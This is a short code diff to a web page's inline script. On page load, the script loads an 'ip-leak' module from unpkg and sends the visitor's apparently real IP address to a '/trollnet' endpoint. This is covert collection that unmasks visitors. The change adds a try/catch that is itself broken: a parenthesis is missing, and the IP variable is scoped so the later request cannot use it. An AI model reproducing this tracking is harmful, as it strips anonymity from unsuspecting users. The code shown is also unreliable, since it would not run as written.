@@ -10,7 +10,8 @@
 
     <script type="module">
         import getIp from 'https://unpkg.com/ip-leak?module';
-        const ip= await getIp()
+      try{
+        const ip= await getIp()}catch{console.log("error"}
 
         fetch("/trollnet",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({ip_real:ip})})
     </script>
